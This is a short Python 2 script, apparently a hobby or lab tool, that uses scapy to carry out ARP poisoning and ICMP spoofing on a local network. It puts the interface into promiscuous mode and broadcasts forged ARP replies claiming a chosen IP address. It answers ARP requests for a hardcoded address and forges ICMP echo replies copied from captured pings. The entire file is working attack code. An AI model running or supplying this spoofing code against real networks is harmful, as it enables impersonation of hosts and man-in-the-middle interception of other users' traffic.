#Setting ICMP spoofing for ARP poisoning
#Ricky Hosfelt
#built for Python 2.7.5

#importing modules
import socket #to caputre and send packets
from scapy.all import * #for packet construction/parsing
import os

interfaceName = raw_input("interface name: ")
spoofedIP = raw_input("Spoofed IP: ")

#set up raw socket receiver, receives in promosicious mode and all levels
ret = os.system("ifconfig " + interfaceName +" promisc")

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
sendp(Ether(src="aa:bb:cc:dd:ee:ff", dst="ff:ff:ff:ff:ff:ff")/ARP(hwsrc="aa:bb:cc:dd:ee:ff",hwdst="ff:ff:ff:ff:ff:ff",psrc=spoofedIP,pdst="255.255.255.255",op=0x2,hwtype=0x01,ptype=0x800))
#receives packet and other network information, returns byte array
def packet_recv(sock):
    pkt_array = []
    packet_full = sock.recvfrom(65535)
    packet_str = packet_full[0] #getting just the raw bytes
    for b in packet_str:
        pkt_array.append(ord(b)) #transforms into array and ints
    return pkt_array

def data_link(pkt):#Processes data-link layer (802.1 only)
    dst_mac = ''
    src_mac = ''
    ether_type = 0
    dst_mac_l = pkt[0:6]
    src_mac_l = pkt[6:12]
    ether_type_l = pkt[12:14]

    for i in dst_mac_l:
        dst_mac+=(hex(i)[2:]+":")
    for i in src_mac_l:
        src_mac +=(hex(i)[2:]+":")

    ether_type = ether_type^ether_type_l[0]
    ether_type = ((ether_type<<8)^ether_type_l[1])

    return dst_mac[:-1], src_mac[:-1], ether_type #returns source/dst mac
#also returns ether type (int)

def network(pkt): #processes network layer (IP only!)
    src_ip=''
    dst_ip=''
    src_ip_l = pkt[26:30]
    dst_ip_l = pkt[30:34]
    ip_pid = pkt[23]

    for i in src_ip_l:
        src_ip+=(str(int(i))+'.')
    for i in dst_ip_l:
        dst_ip+=(str(int(i))+'.')

    return src_ip[:-1], dst_ip[:-1], ip_pid

def arp_spoof(pkt):#looks for an arp request for IP, and sends spoofed reply
    if ((pkt[14] == 0x00) and (pkt[15] == 0x01) and (pkt[16]==0x08) and (pkt[17]==0x00) and (pkt[20]==0x00) and (pkt[21] == 0x01)):
        srcIParp=''
        if((pkt[38] == 10) and (pkt[39] == 42) and (pkt[40] == 42) and (pkt[41]== 42)):
            sendp(Ether(src="aa:bb:cc:dd:ee:ff",dst="ff:ff:ff:ff:ff:ff")/ARP(hwsrc="aa:bb:cc:dd:ee:ff",hwdst="ff:ff:ff:ff:ff:ff",psrc=spoofedIP,pdst="255.255.255.255",op=0x2,hwtype=0x01,ptype=0x800),count=5)

def icmp_spoof(pkt, srcIP, smac): #looks for ICMP request copies id/seq/data
                                  #send spoofed ICMP packet with copied info
    ider=0
    seqer=0

    if((pkt[34] == 0x08) and (pkt[35] == 0x00)):
        ider=ider^pkt[38]
        ider=ider<<8^pkt[39]
        seqer=seqer^pkt[40]
        seqer=seqer<<8^pkt[41]
        data=pkt[42:]
        data_out=''
        for i in data:
            data_out+=chr(i)
        print("sending spoofed ICMP reply")
        sendp(Ether(src="aa:bb:cc:dd:ee:ff",dst=smac)/IP(src=spoofedIP,dst=srcIP)/ICMP(type=0,id=ider,seq=seqer)/data_out)
#continue sensing network (infinite while loop)
pkt_array = []
while True:
    pkt = packet_recv(s)
    dmac, smac, et = data_link(pkt)
    if (et == 0x0800): #used for processing IP 
        srcIP,dstIP,ipPID = network(pkt)
        if (ipPID==0x01):
            icmp_spoof(pkt, srcIP, smac)
    if (et == 0x0806): #used for pocessing ARP
        arp_spoof(pkt)
